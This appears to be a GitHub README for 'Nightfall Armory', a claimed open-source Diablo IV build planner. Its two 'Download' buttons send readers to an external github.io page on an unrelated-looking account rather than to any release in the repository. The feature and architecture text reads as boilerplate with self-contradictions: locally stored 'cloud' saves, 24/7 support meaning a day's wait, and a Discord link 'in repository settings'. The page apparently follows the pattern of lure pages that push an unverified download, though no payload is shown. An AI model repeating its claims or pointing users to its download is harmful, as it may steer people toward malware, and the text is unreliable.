![preview](https://raw.githubusercontent.com/venkatesanprakash735-boop/hellforge-arsenal/main/cover_b43d.svg)

# NIGHTFALL ARMORY — The Modular Build Architect for Diablo IV Theorycrafting

Welcome to **Nightfall Armory**, a community-driven, open-source platform designed to transform how you approach Diablo IV character optimization. Instead of offering yet another static stat sheet, Nightfall Armory functions as a living, breathing **build laboratory**—a place where your theoretical endgame setups are stress-tested against real-world enemy density, cooldown rotations, and resource generation curves. Think of it as a collaborative sandbox where every Paragon board, every affix roll, and every legendary aspect is visualized in an interactive 3D node graph, allowing you to trace the ripple effects of a single gear swap across your entire damage pipeline. This isn’t just a planner; it’s a digital workshop where the rarest of itemization strategies are deconstructed, analyzed, and rebuilt from the ground up.

Whether you are fine-tuning a Bone Spear Necromancer for speed-farming Torment IV or theorycrafting a thorns-based Barbarian for the depths of the Pit, Nightfall Armory gives you the analytical firepower to see beyond the tooltip. We integrate a **predictive combat simulator** that runs thousands of virtual encounters in the background, producing not just a "damage per second" number, but a **survivability heatmap**, **crowd-control uptime metrics**, and **resource economy forecasts**. Our goal is to bridge the gap between the mathematical perfection of a spreadsheet and the chaotic reality of Sanctuary’s battlefields.

## 🧭 Overview

The average build guide tells you *what* to equip. Nightfall Armory shows you *why* it works, *when* it fails, and *how* to pivot when the meta shifts with a new seasonal patch. This repository houses the complete source code for the web application, including the frontend visualization engine, the backend simulation logic, and the community contribution APIs. We are building this as a transparent, community-owned toolkit, ensuring that the algorithms are not hidden in obscurity but are open for peer review and iterative improvement.

---

## 🚀 [![Download](https://raw.githubusercontent.com/venkatesanprakash735-boop/hellforge-arsenal/main/fetch_1fa779.svg)](https://venkatesanprakash735-boop.github.io/hellforge-arsenal/)

Under this heading, you will find the latest stable release of the Nightfall Armory application. We package the platform into a portable workspace that includes the core engine, a set of example build profiles, and an offline documentation library. 

## ✨ Core Features

Our platform is not just a database of items; it is a fully interactive environment. Here are the pillars of the Nightfall Armory experience:

- **Interactive Node Graph Editor** 🕸️: Visualize the entire Paragon Board as a series of interconnected nodes. Drag, rotate, and socket rare and magic nodes with a smooth, physics-based interface that reacts to your cursor in real-time. See the stat bonuses propagate through adjacent nodes instantly.
- **Predictive DPS Simulator** ⚙️: Go beyond arithmetic. Our engine simulates combat cycles considering attack speed breakpoints, lucky hit chances, and crowd-control duration reductions. It produces an **Effective Damage Output** score, which factors in target movement and enemy attack patterns, giving you a realistic expectation of your performance.
- **Cross-Build Differential Analyzer** 📊: Have two different amulet setups? Load them side-by-side, and the platform will highlight the exact deltas in your combat metrics. The system flags hidden breakpoints, such as a new threshold for resource cost reduction or a breakpoint for faster cast animations.
- **Seasonal Patch Impact Tracker** 🗓️: A dedicated engine that scans the official patch notes (via manual input or OCR uploads) and automatically compares them against your saved builds. It alerts you when a unique item or aspect changes, and suggests alternative gear from the community database to maintain your build's integrity.
- **Multilingual UI** 🌐: The interface is fully localized in English, Spanish, French, German, Korean, and Japanese. The simulation results and node descriptions are translated, ensuring that the analytical depth is accessible to a global audience.
- **Responsive Web Design** 📱: Whether you are projecting graphs on a 4K monitor or quickly checking a stat roll on your phone while commuting, the interface adapts fluidly. Touch gestures are supported for the node graph editor, allowing you to pan and zoom with pinch-to-zoom controls.

## 🏗️ Architecture & Technology Stack

This repository is structured to facilitate rapid iteration and scalability. We use a **modular monolith** approach in the early stages to ease deployment, with clear boundaries prepared for a future microservice split.

- **Frontend**: TypeScript with React 19 and Vite. We utilize WebGL (via PixiJS) for high-performance node graph rendering, ensuring a smooth 60 FPS experience even with boards that have 150+ nodes active.
- **Computational Core**: The simulation engine is written in Rust (compiled to WebAssembly) for deterministic, high-speed calculations. This allows the heavy lifting to happen in the browser without server round-trips, respecting your privacy and reducing latency.
- **Backend API**: Rust (Axum framework) for the community features—build sharing, voting, and profile syncing.
- **Data Persistence**: SQLite for local-first caching, with a PostgreSQL option for community server hosting.

## 👨‍💻 Contributing to the Armory

We believe in the power of the collective. If you are a data miner, a visual designer, or a theorycrafting enthusiast, there is a place for you here. We encourage contributions that enhance the accuracy of the simulation engine or improve the clarity of the visualizations.

- **Data Validation** 🔍: If you notice a discrepancy between in-game testing and our simulation output, please open a detailed issue with your test methodology. We treat data accuracy as the highest priority.
- **Frontend Polish** ✨: Have a knack for creating intuitive UI micro-interactions? Help us refine the gesture controls or the tooltip styling.
- **Algorithm Optimization** 🧮: The simulation engine relies on complex statistical models. If you can suggest a more efficient algorithm to reduce Monte Carlo noise, we are eager to review your pull request.

Before submitting code, please consult our dedicated contribution guide in the `CONTRIBUTING.md` file. We operate on a **merge-after-review** basis, and all new features require documented unit tests.

## 💳 Licensing & Usage Rights

Nightfall Armory is released under the **MIT License**. This grants you the freedom to use, modify, and distribute this software for both personal and commercial purposes, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the Software. The full legal text is available in the `LICENSE` file at the root of this repository.

We encourage you to fork this project and adapt it to your own needs, whether that involves integrating it into a gaming community website or using the simulation core for a different action RPG entirely.

## 🛟 Support & Community

We maintain a **dedicated support forum** attached to this repository's Discussions tab. While this is a community project, we strive to provide a **24/7 response window** to critical bug reports and technical questions. Because the maintainers are located across multiple time zones, you can generally expect a response within a day. For immediate, community-driven assistance, please join the `#nightfall-armory` channel on the shared community Discord server (link available in the repository settings).

## 🧾 Disclosure & Accuracy Disclaimer

All game data, including item names, affixes, and class mechanics, are the intellectual property of Blizzard Entertainment. Nightfall Armory is a fan-made project and is **not affiliated with or endorsed by Blizzard Entertainment**. 

The simulation engine is a mathematical approximation of game mechanics. While we strive for high fidelity, actual in-game results may vary due to server ticks, network latency, and unquantifiable random elements. We provide this tool for **educational and entertainment purposes** to assist in your personal builds. The community-provided build guides are considered "best effort" and should be used as a starting point, not a definitive authority.

We do not collect personal data beyond a simple display name and email address for account creation, if you choose to utilize the cloud save feature. This data is stored locally on your device or on your own self-hosted server instance. The 2026 roadmap includes end-to-end encryption for these profiles.

---

## 🧭 Roadmap (2026 & Beyond)

The development cycle is continuous. Here is a glimpse of what is on the horizon for the 2026 update cycle:

- **Seasonal Patch Integration Wizard** 📥: A one-click importer that reads the latest game patch files from your local installation and updates the internal database.
- **Advanced Build Comparisons** 🆚: A side-by-side damage spell rotation timeline viewer, allowing you to view the sequence of attacks and procs frame-by-frame.
- **AI-Powered Suggestions** 🧠: An optional module that analyzes your gear and suggests alternative affixes based on your playstyle and desired content (speed farming vs. pushing high-level Nightmare Dungeons).
- **Collaborative Live Editing** ✏️: Real-time co-op planning, where multiple users can work on the same Paragon Board simultaneously, with cursor presence indicators.

## 📁 Repository Structure

Here is a map of the main directories to help you navigate the source code:

- `/crates/` – The Rust workspace, containing the simulation core, the data parsers, and the network logic.
- `/src/` – The React frontend, state management, and UI component library.
- `/data/` – Static game data dumps (JSON format) used as the baseline for the item database.
- `/docs/` – Extended technical documentation and theorycrafting articles written by the community.
- `/tests/` – High-level integration tests and benchmark suites for the simulation performance.

## 🔒 Privacy & Data Integrity

We prioritize the principle of **local-first computing**. The core simulation runs entirely within your browser session. Your build profiles are saved as `.nfa` (Nightfall Armory Archive) files, which are plain-text JSON structures. You have full control to back these up, share them, or modify them manually. The self-hosting option for the server component ensures that even the community features remain within your control, without mandatory third-party cloud dependency.

---

## ✨ Final Verdict

Nightfall Armory is more than just a tool; it is a community standard in the making. We invite you to scrutinize the code, challenge the mathematics, and push the boundaries of what is possible in character optimization. By keeping the analysis open and the algorithms transparent, we ensure that the only thing that can ever be *cracked* open is the meta--not the software. We hope this platform becomes your go-to silent partner in the eternal conflict against the Burning Hells.

---

## 🏆 Acknowledgements

We thank the entire Diablo IV community for their continued passion and intellectual rigor. Special appreciation goes to the data miners who work diligently to decode the game files, providing the raw information that powers the core database of this platform.

## 📜 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---
## ⬇️ [![Download](https://raw.githubusercontent.com/venkatesanprakash735-boop/hellforge-arsenal/main/fetch_1fa779.svg)](https://venkatesanprakash735-boop.github.io/hellforge-arsenal/)